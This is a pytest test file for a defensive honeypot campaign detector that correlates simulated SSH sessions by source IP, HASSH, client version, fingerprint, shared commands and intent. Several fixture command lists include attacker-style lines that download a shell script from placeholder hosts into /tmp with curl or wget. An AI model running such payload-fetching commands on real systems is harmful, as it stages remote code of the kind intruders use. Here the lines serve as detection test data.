from intelligence.campaign.detector import CampaignDetector
from intelligence.fingerprint.engine import FingerprintEngine
from intelligence.intent.classifier import IntentClassifier
from intelligence.session.model import ReconstructedSession


def build_session(
    session_id: str,
    source_ip: str,
    commands: list,
    start_time: str = None,
    end_time: str = None,
    client_version: str = "SSH-2.0-OpenSSH_8.2p1",
    hassh: str = "abc123",
) -> ReconstructedSession:
    session = ReconstructedSession(
        session_id=session_id,
        source_ip=source_ip,
        protocol="ssh",
        client_version=client_version,
        hassh=hassh,
        commands=commands,
        start_time=start_time,
        end_time=end_time,
        duration_ms=30000,
    )

    return session


def test_same_source_ip_alone_does_not_create_campaign():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ["ls", "whoami"],
        client_version="SSH-2.0-ClientA",
        hassh="hassh-A",
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ["pwd", "hostname"],
        client_version="SSH-2.0-ClientB",
        hassh="hassh-B",
    )

    campaign = detector.correlate(session_one, session_two)

    assert campaign is None
    assert detector.get_all() == {}


def test_same_client_version_alone_does_not_create_campaign():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ["ls", "whoami"],
        client_version="SSH-2.0-OpenSSH_8.2p1",
        hassh="hassh-A",
    )

    session_two = build_session(
        "session-2",
        "10.0.0.2",
        ["pwd", "hostname"],
        client_version="SSH-2.0-OpenSSH_8.2p1",
        hassh="hassh-B",
    )

    campaign = detector.correlate(session_one, session_two)

    assert campaign is None
    assert detector.get_all() == {}


def test_same_hassh_creates_campaign():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        [
            "ls",
            "curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh",
        ],
        client_version="SSH-2.0-ClientA",
        hassh="shared-hassh",
    )

    session_two = build_session(
        "session-2",
        "10.0.0.2",
        [
            "pwd",
            "curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh",
        ],
        client_version="SSH-2.0-ClientB",
        hassh="shared-hassh",
    )

    campaign = detector.correlate(session_one, session_two)

    assert campaign is not None
    assert "same_hassh" in campaign.correlation_reasons

def test_shared_commands_create_campaign():
    detector = CampaignDetector()

    # The shared distinctive command is the behavioral signal; same source
    # IP is the required context. HASSH and client version deliberately differ.
    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        client_version="SSH-2.0-ClientA",
        hassh="hassh-A",
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['whoami', 'pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        client_version="SSH-2.0-ClientB",
        hassh="hassh-B",
    )

    campaign = detector.correlate(session_one, session_two)

    assert campaign is not None
    assert "same_source_ip" in campaign.correlation_reasons
    assert "shared_commands" in campaign.correlation_reasons
    assert "same_hassh" not in campaign.correlation_reasons
    assert "same_client_version" not in campaign.correlation_reasons


def test_unrelated_sessions_do_not_create_campaign():
    detector = CampaignDetector()

    session_one = ReconstructedSession(
        session_id="session-1",
        source_ip="10.0.0.1",
        protocol="ssh",
        client_version="OpenSSH-8.2",
        hassh="hassh-one",
        commands=["ls"],
    )

    session_two = ReconstructedSession(
        session_id="session-2",
        source_ip="10.0.0.2",
        protocol="ftp",
        client_version="FTP-client",
        hassh="hassh-two",
        commands=["upload"],
    )

    campaign = detector.correlate(
        session_one,
        session_two,
    )

    assert campaign is None


def test_same_fingerprint_creates_campaign():
    detector = CampaignDetector()
    fingerprint_engine = FingerprintEngine()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.2",
        ['whoami', 'ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    fingerprint_one = fingerprint_engine.process(
        session_one
    )

    fingerprint_two = fingerprint_engine.process(
        session_two
    )

    assert (
        fingerprint_one.fingerprint_id
        == fingerprint_two.fingerprint_id
    )

    campaign = detector.correlate(
        session_one,
        session_two,
        fingerprint_one,
        fingerprint_two,
    )

    assert campaign is not None
    assert "same_fingerprint" in campaign.correlation_reasons
    # The fingerprint is derived from HASSH/client profile attributes and
    # must not add another confidence factor on top of those same signals.
    assert "same_fingerprint" not in campaign.confidence_factors
    assert campaign.confidence_score == 40


def test_shared_intent_is_recorded():
    detector = CampaignDetector()
    classifier = IntentClassifier()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.2",
        ['id', 'uname -a', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    intents_one = classifier.classify(
        session=session_one
    )

    intents_two = classifier.classify(
        session=session_two
    )

    campaign = detector.correlate(
        session_one,
        session_two,
        intents_one=intents_one,
        intents_two=intents_two,
    )

    assert campaign is not None
    assert "shared_intent" in campaign.correlation_reasons
    assert "discovery" in campaign.intents
    assert "reconnaissance" in campaign.phases


def test_related_sessions_are_aggregated_into_one_campaign():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_three = build_session(
        "session-3",
        "10.0.0.1",
        ['pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    campaign_one = detector.correlate(
        session_one,
        session_two,
    )

    campaign_two = detector.correlate(
        session_two,
        session_three,
    )

    assert campaign_one is not None
    assert campaign_two is not None

    assert campaign_one.campaign_id == campaign_two.campaign_id

    assert campaign_two.session_ids == [
        "session-1",
        "session-2",
        "session-3",
    ]

    assert len(detector.get_all()) == 1


def test_observe_does_not_correlate_on_source_ip_alone():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ["ls", "whoami"],
        client_version="SSH-2.0-ClientA",
        hassh="hassh-A",
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ["pwd", "hostname"],
        client_version="SSH-2.0-ClientB",
        hassh="hassh-B",
    )

    first_result = detector.observe(session_one)
    second_result = detector.observe(session_two)

    assert first_result is None
    assert second_result is None
    assert detector.get_all() == {}


def test_observe_preserves_fingerprint_intelligence():
    detector = CampaignDetector()
    fingerprint_engine = FingerprintEngine()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.2",
        ['whoami', 'ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    fingerprint_one = fingerprint_engine.process(
        session_one
    )

    fingerprint_two = fingerprint_engine.process(
        session_two
    )

    campaign = detector.observe(
        session_one,
        fingerprint=fingerprint_one,
    )

    assert campaign is None

    campaign = detector.observe(
        session_two,
        fingerprint=fingerprint_two,
    )

    assert campaign is not None
    assert "same_fingerprint" in campaign.correlation_reasons

    assert fingerprint_one.fingerprint_id in (
        campaign.fingerprint_ids
    )

    assert fingerprint_two.fingerprint_id in (
        campaign.fingerprint_ids
    )


def test_observe_preserves_intent_intelligence():
    detector = CampaignDetector()
    classifier = IntentClassifier()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.2",
        ['id', 'uname -a', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    intents_one = classifier.classify(
        session=session_one
    )

    intents_two = classifier.classify(
        session=session_two
    )

    campaign = detector.observe(
        session_one,
        intents=intents_one,
    )

    assert campaign is None

    campaign = detector.observe(
        session_two,
        intents=intents_two,
    )

    assert campaign is not None
    assert "shared_intent" in campaign.correlation_reasons

    assert "discovery" in campaign.intents
    assert "reconnaissance" in campaign.phases

def test_observing_first_session_repeatedly_does_not_create_campaign():
    detector = CampaignDetector()

    session = build_session(
        "session-1",
        "10.0.0.1",
        ["ls", "whoami"],
    )

    first_result = detector.observe(session)
    repeated_result = detector.observe(session)

    assert first_result is None
    assert repeated_result is None
    assert len(detector.sessions) == 1
    assert detector.get_all() == {}

def test_observe_same_session_id_is_idempotent():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    first_result = detector.observe(session_one)

    assert first_result is None

    second_result = detector.observe(session_two)

    assert second_result is not None
    assert second_result.session_ids == [
        "session-1",
        "session-2",
    ]

    repeated_result = detector.observe(session_two)

    assert repeated_result is not None
    assert repeated_result.session_ids == [
        "session-1",
        "session-2",
    ]

    assert len(detector.sessions) == 2
    assert len(detector.get_all()) == 1


def test_related_campaigns_are_merged_when_new_evidence_connects_them():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['curl -fsSL https://example.com/alpha.sh -o /tmp/alpha.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['curl -fsSL https://example.com/alpha.sh -o /tmp/alpha.sh', "python3 -c 'import os; print(os.uname())'"],
    )

    session_three = build_session(
        "session-3",
        "10.0.0.2",
        ['wget https://example.net/beta.sh -O /tmp/beta.sh', "python3 -c 'import os; print(os.uname())'"],
    )

    session_four = build_session(
        "session-4",
        "10.0.0.2",
        ['wget https://example.net/beta.sh -O /tmp/beta.sh'],
    )

    campaign_one = detector.correlate(
        session_one,
        session_two,
    )

    campaign_two = detector.correlate(
        session_three,
        session_four,
    )

    assert campaign_one is not None
    assert campaign_two is not None

    assert campaign_one.campaign_id != campaign_two.campaign_id
    assert len(detector.get_all()) == 2

    bridge_campaign = detector.correlate(
        session_two,
        session_three,
    )

    assert bridge_campaign is not None
    assert len(detector.get_all()) == 1

    assert bridge_campaign.session_ids == [
        "session-1",
        "session-2",
        "session-3",
        "session-4",
    ]


def test_campaign_records_first_and_last_seen_times():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        start_time="2026-09-20T10:00:00+00:00",
        end_time="2026-09-20T10:05:00+00:00",
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        start_time="2026-09-20T11:00:00+00:00",
        end_time="2026-09-20T11:10:00+00:00",
    )

    campaign = detector.correlate(
        session_one,
        session_two,
    )

    assert campaign is not None
    assert campaign.first_seen == "2026-09-20T10:00:00+00:00"
    assert campaign.last_seen == "2026-09-20T11:10:00+00:00"


def test_campaign_temporal_metadata_updates_when_campaign_grows():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        start_time="2026-09-20T10:00:00+00:00",
        end_time="2026-09-20T10:05:00+00:00",
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        start_time="2026-09-20T11:00:00+00:00",
        end_time="2026-09-20T11:10:00+00:00",
    )

    session_three = build_session(
        "session-3",
        "10.0.0.1",
        ['pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        start_time="2026-09-20T09:00:00+00:00",
        end_time="2026-09-20T12:00:00+00:00",
    )

    campaign = detector.correlate(
        session_one,
        session_two,
    )

    assert campaign is not None

    campaign = detector.correlate(
        session_two,
        session_three,
    )

    assert campaign is not None
    assert campaign.first_seen == "2026-09-20T09:00:00+00:00"
    assert campaign.last_seen == "2026-09-20T12:00:00+00:00"

def test_campaign_confidence_score_reflects_correlation_evidence():
    detector = CampaignDetector()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['whoami', 'pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    campaign = detector.correlate(
        session_one,
        session_two,
    )

    assert campaign is not None

    assert campaign.confidence_score == 70

    assert campaign.confidence_factors == {
        "same_source_ip": 30,
        "same_hassh": 25,
        "same_client_version": 5,
        "shared_commands": 10,
    }

def test_campaign_confidence_score_combines_all_evidence_types():
    detector = CampaignDetector()
    fingerprint_engine = FingerprintEngine()
    classifier = IntentClassifier()

    session_one = build_session(
        "session-1",
        "10.0.0.1",
        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    session_two = build_session(
        "session-2",
        "10.0.0.1",
        ['whoami', 'hostname', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
    )

    fingerprint_one = fingerprint_engine.process(
        session_one
    )

    fingerprint_two = fingerprint_engine.process(
        session_two
    )

    intents_one = classifier.classify(
        session=session_one
    )

    intents_two = classifier.classify(
        session=session_two
    )

    campaign = detector.correlate(
        session_one,
        session_two,
        fingerprint_one,
        fingerprint_two,
        intents_one,
        intents_two,
    )

    assert campaign is not None

    # Fingerprint match is recorded but not double-counted because it is
    # derived from protocol, HASSH, and client version.
    assert campaign.confidence_score == 80

    assert campaign.confidence_factors == {
        "same_source_ip": 30,
        "same_hassh": 25,
        "same_client_version": 5,
        "shared_commands": 10,
        "shared_intent": 10,
    }


def test_common_commands_alone_do_not_create_campaign():
    detector = CampaignDetector()

    session_one = build_session(
        "common-commands-1",
        "10.0.0.10",
        ["ls", "whoami", "pwd"],
        client_version="SSH-2.0-ClientA",
        hassh="hassh-A",
    )
    session_two = build_session(
        "common-commands-2",
        "10.0.0.20",
        ["ls", "whoami", "pwd"],
        client_version="SSH-2.0-ClientB",
        hassh="hassh-B",
    )

    campaign = detector.correlate(session_one, session_two)

    assert campaign is None
    assert detector.get_all() == {}


def test_repeated_correlation_does_not_duplicate_campaign_sessions():
    detector = CampaignDetector()

    session_one = build_session(
        "repeat-1", "10.0.0.10", ['ls', 'whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh']
    )
    session_two = build_session(
        "repeat-2", "10.0.0.20", ['whoami', 'pwd', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh']
    )

    first = detector.correlate(session_one, session_two)
    second = detector.correlate(session_one, session_two)

    assert first is not None
    assert second is not None
    assert len(detector.get_all()) == 1
    assert second.session_ids == ["repeat-1", "repeat-2"]


def test_same_hassh_alone_does_not_create_campaign():
    detector = CampaignDetector()

    session_one = build_session(
        "hassh-only-1",
        "10.0.0.10",
        ["whoami", "pwd"],
        client_version="SSH-2.0-ClientA",
        hassh="shared-hassh",
    )
    session_two = build_session(
        "hassh-only-2",
        "10.0.0.20",
        ["ls", "uname -a"],
        client_version="SSH-2.0-ClientA",
        hassh="shared-hassh",
    )

    campaign = detector.correlate(session_one, session_two)

    assert campaign is None
    assert detector.get_all() == {}


def test_generic_commands_and_shared_hassh_do_not_merge_campaigns():
    detector = CampaignDetector()

    session_one = build_session(
        "bridge-1",
        "10.0.0.10",
        ["whoami", "pwd"],
        client_version="SSH-2.0-ClientA",
        hassh="hassh-A",
    )
    session_two = build_session(
        "bridge-2",
        "10.0.0.20",
        ["ls", "hostname"],
        client_version="SSH-2.0-ClientB",
        hassh="hassh-A",
    )
    session_three = build_session(
        "bridge-3",
        "10.0.0.30",
        ["id", "uname -a"],
        client_version="SSH-2.0-ClientC",
        hassh="hassh-C",
    )

    first = detector.correlate(session_one, session_two)
    assert first is None

    second = detector.correlate(session_two, session_three)
    assert second is None
    assert detector.get_all() == {}
